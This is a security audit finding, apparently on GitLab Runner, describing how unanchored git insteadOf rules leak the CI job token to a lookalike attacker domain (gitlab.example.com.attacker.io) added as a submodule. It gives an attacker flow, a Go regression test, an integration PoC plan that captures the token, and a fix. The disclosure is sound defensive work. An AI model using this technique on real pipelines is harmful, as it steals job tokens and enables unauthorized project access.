### Title
Git `insteadOf` submodule credential rules are unanchored host prefixes, allowing job-token leakage to attacker-registered domains - (File: `helpers/url/gitauth.go`, `shells/abstract.go`)

### Summary
The external git config generated for clone/submodule authentication (built in `AbstractShell.setupExternalGitConfig` and applied to every submodule via `configureSubmoduleCredentials`/`writeSubmoduleUpdateCmd` in `shells/abstract.go`, using base URLs from `helpers/url/gitauth.go`'s `GetInsteadOfs`/`repoBaseInsteadOf`) writes `url.<credentialed-base>.insteadOf <base>` entries whose right-hand side is a bare, un-anchored URL string (no trailing `/`). Git's `insteadOf` matching is a literal string-prefix match, not a hostname-boundary match, so any submodule URL that merely starts with that string (e.g. `https://gitlab.example.com.attacker.io/x.git`) is rewritten to include the job token and the credentials are sent to the attacker-controlled host.

### Finding Description
`GitAuthHelper.GetInsteadOfs()` and `repoBaseInsteadOf()` in `helpers/url/gitauth.go` produce insteadOf pairs by calling `trimmed()`, which only does `strings.TrimRight(u.String(), "/")` — stripping any trailing slash rather than guaranteeing one: [1](#0-0) 

`repoBaseInsteadOf` explicitly builds a host-only base (path stripped) specifically so that "submodules referencing other projects on the same host" get credentials, and returns it via `trimmed`, again without a trailing `/`: [2](#0-1) 

These pairs are written into the runner's external git config file as `git config --file <ext> --replace-all url.<withCreds>.insteadOf <withoutCreds> <pattern>` in `AbstractShell.setupExternalGitConfig`: [3](#0-2) 

The `<pattern>` regex (`^...$`) is only used by `git config --replace-all` to decide *which existing config lines to overwrite when writing the file* — it has no effect on how `url.<x>.insteadOf` is applied by git at fetch time. Git's actual `insteadOf` matching is a raw string-prefix substitution on the URL, with no scheme/host boundary enforcement.

The config is then force-included into every submodule, regardless of that submodule's own remote host, via `configureSubmoduleCredentials`, invoked unconditionally from `writeSubmoduleUpdateCmd`: [4](#0-3) [5](#0-4) 

Attacker flow:
1. A pipeline author (unprivileged w.r.t. runner/GitLab admin, but able to push to a branch/MR that triggers a job) edits `.gitmodules` to add a submodule with `url = https://gitlab.example.com.attacker.io/x.git`, a domain the attacker fully controls under `attacker.io`, chosen only because its literal string starts with the runner's configured GitLab host string.
2. The job runs with `GIT_SUBMODULE_STRATEGY` set to fetch submodules. `setupExternalGitConfig`/`GetInsteadOfs` writes `url.https://gitlab-ci-token:<TOKEN>@gitlab.example.com.insteadOf https://gitlab.example.com` into the external git config, and `configureSubmoduleCredentials`/`withExplicitSubmoduleCreds` make that config apply to every submodule (`git -c include.path=<ext-conf> submodule update ...`, then `git submodule foreach --recursive git config --replace-all include.path <ext-conf>`).
3. When git resolves the submodule URL `https://gitlab.example.com.attacker.io/x.git`, it matches the literal prefix `https://gitlab.example.com` (no boundary character required after "com") and rewrites it to `https://gitlab-ci-token:<TOKEN>@gitlab.example.com.attacker.io/x.git`.
4. Git connects to the attacker's actual server (`gitlab.example.com.attacker.io`), sending an HTTP Basic Auth header containing the real `CI_JOB_TOKEN` in the clear to that attacker-controlled endpoint.

No existing check stops this: there is no host/anchor validation when constructing the insteadOf base, no allow-list of submodule hosts, and masking only obscures the token in job logs/traces, not in outbound git network requests.

### Impact Explanation
This results in disclosure of the job's `CI_JOB_TOKEN` to an attacker-controlled server outside GitLab, reachable purely by an unprivileged pipeline author editing `.gitmodules` in a branch/MR that triggers a runner job. The stolen job token can then be replayed against the GitLab API/registry within its permission scope (project/job-token-access rules), enabling cross-project or unauthorized access limited only by whatever scope GitLab grants that job token — this is exactly the "token disclosure / cross-project unauthorized access" impact called out in the question.

### Likelihood Explanation
Fully attacker-reachable with no special runner or GitLab privileges: any user able to open an MR/push a branch that contains a modified `.gitmodules` and trigger a CI job with `GIT_SUBMODULE_STRATEGY` set can exploit this. It requires registering/controlling a domain whose name literally begins with the target GitLab instance's hostname string as a substring followed by attacker-owned suffix (e.g. `gitlab.example.com.attacker.io`), which is trivial and repeatable — no race conditions, timing, or race with cleanup needed.

### Recommendation
Anchor all `insteadOf` base URLs (and their SSH counterparts) at a URL boundary, not just a literal string prefix: always normalize the base to include a trailing `/` (or otherwise ensure the matched prefix ends exactly at the host/path boundary) before writing `url.<x>.insteadOf <base>` in both `helpers/url/gitauth.go` (`trimmed`, `GetInsteadOfs`, `repoBaseInsteadOf`, `sshInsteadOfs`) and `functions/concrete/run/stages/get_sources.go`'s `setupExternalGitConfig`. Additionally, consider restricting `repoBaseInsteadOf`'s "any project on the same host" credential injection to only recognize the configured GitLab server hostname exactly (parsed via `net/url`, comparing `Host` field equality) rather than string-prefix matching against the whole URL.

### Proof of Concept
Go unit test in `helpers/url` (extending `gitauth_test.go`):
```go
func TestGetInsteadOfs_PrefixHijack(t *testing.T) {
    c := defaultConfig() // CloneURL/RepoURL host = "gitlab.example.com"
    h := NewGitAuthHelper(c, true)
    ios, err := h.GetInsteadOfs()
    require.NoError(t, err)

    // Simulate what git actually does: literal prefix match, not host-aware.
    attackerSubmoduleURL := "https://gitlab.example.com.attacker.io/x.git"
    var rewritten string
    for _, io := range ios {
        if strings.HasPrefix(attackerSubmoduleURL, io[1]) {
            rewritten = io[0] + strings.TrimPrefix(attackerSubmoduleURL, io[1])
        }
    }
    // BUG: expect no match (rewritten == ""), but current code matches and
    // injects the job token toward the attacker's host.
    assert.Equal(t, "", rewritten, "credentialed insteadOf must not match attacker-controlled suffix domains")
}
```
Integration-level PoC job plan: create a repo with a submodule in `.gitmodules` pointing at `https://<gitlab-host>.attacker-controlled.example/x.git` (a domain the tester controls with an HTTP listener logging Authorization headers), run a job with `GIT_SUBMODULE_STRATEGY: recursive`, and assert the listener receives an `Authorization: Basic ...` header decoding to `gitlab-ci-token:<CI_JOB_TOKEN>`.

### Citations

**File:** helpers/url/gitauth.go (L114-135)
```go
// repoBaseInsteadOf returns an insteadOf entry for the RepoURL base (without the project path) so
// that submodules referencing other projects on the same host can be rewritten with credentials.
// The RepoURL may differ from CloneURL since it comes from the API rather than runner config.
// See: https://gitlab.com/gitlab-org/gitlab-runner/-/issues/39170
func (h *GitAuthHelper) repoBaseInsteadOf() (*[2]string, error) {
	repoURL, err := url.Parse(h.config.RepoURL)
	if err != nil || !isHTTP(repoURL) {
		return nil, err
	}

	base := *repoURL
	base.Path = ""

	authed, err := h.applyAuth(&base)
	if err != nil {
		return nil, err
	}

	base.User = nil

	return &[2]string{trimmed(authed), trimmed(&base)}, nil
}
```

**File:** helpers/url/gitauth.go (L194-196)
```go
func trimmed(u *url.URL) string {
	return strings.TrimRight(u.String(), "/")
}
```

**File:** shells/abstract.go (L862-870)
```go
	// De-duplicate insteadOfs entries to avoid redundant git config rules
	insteadOfs = deduplicateInsteadOfs(insteadOfs)

	for _, io := range insteadOfs {
		replaceStanza := "url." + io[0] + ".insteadOf"
		orgURL := io[1]
		pattern := "^" + regexp.QuoteMeta(orgURL) + "$"
		w.CommandArgExpand("git", "config", "--file", extConfigFile, "--replace-all", replaceStanza, orgURL, pattern)
	}
```

**File:** shells/abstract.go (L1303-1309)
```go
	// Configure each submodule to include the external git config.
	// This allows git operations inside submodule directories (e.g., cd patches && git pull)
	// to authenticate properly using the parent repo's credentials.
	// This is done once at the end, after all submodule operations are complete.
	// See: https://gitlab.com/gitlab-org/gitlab-runner/-/issues/39133
	w.Noticef("Configuring submodules to use parent git credentials...")
	b.configureSubmoduleCredentials(w, foreachArgs, recursive)
```

**File:** shells/abstract.go (L1334-1346)
```go
// configureSubmoduleCredentials configures each submodule to include the external git config
// from the parent repository. This allows git operations inside submodule directories
// (e.g., cd patches && git pull) to authenticate properly using the parent repo's credentials.
func (b *AbstractShell) configureSubmoduleCredentials(w ShellWriter, foreachArgs []string, recursive bool) {
	args := slices.Clip(foreachArgs)
	// Even if `GIT_SUBMODULE_STRATEGY: normal` is used, we should set up the credentials
	// for all the Git submodules to preserve existing workflows.
	if !recursive {
		args = append(args, "--recursive")
	}
	args = append(args, "git", "config", "--replace-all", "include.path", w.EnvVariableKey(envVarExternalGitConfigFile))
	w.CommandArgExpand("git", args...)
}
```
